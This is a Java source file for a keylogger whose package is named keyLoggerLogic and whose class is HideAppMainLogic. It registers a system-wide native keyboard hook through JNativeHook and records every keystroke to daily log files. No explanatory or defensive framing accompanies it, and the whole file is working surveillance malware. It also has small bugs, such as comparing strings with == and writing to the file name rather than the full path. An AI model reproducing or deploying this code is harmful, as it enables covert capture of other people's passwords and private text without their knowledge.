package App.keyLoggerLogic;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.*;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.io.BufferedWriter;
import java.time.LocalDate;

public class HideAppMainLogic implements NativeKeyListener
{
    public static void mainLogicStart() {
        try {
            GlobalScreen.registerNativeHook();
        }catch (NativeHookException e){
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new HideAppMainLogic());

    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent e)
    {
        String catchedLetter;
        if (NativeKeyEvent.getKeyText(e.getKeyCode())=="Space")
        {
            catchedLetter = " ";
            saveLogs(catchedLetter);
        }else
        {
            catchedLetter  = (NativeKeyEvent.getKeyText(e.getKeyCode()));
            System.out.println(catchedLetter);
            saveLogs(catchedLetter);
        }

    }
    private void saveLogs(String getCatchedLetter) {
        LocalDate data = LocalDate.now();
        String stringData = data.toString();
        File exitFile = new File("Logs/lg/logs - "+stringData+".txt");
        FileWriter writeLogs;
        if (!exitFile.exists()) {
            try {
                exitFile.createNewFile();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        try {
            writeLogs = new FileWriter(exitFile.getName(), true);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        BufferedWriter buffor = new BufferedWriter(writeLogs);
        try {
            buffor.write(getCatchedLetter);
            buffor.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }



}
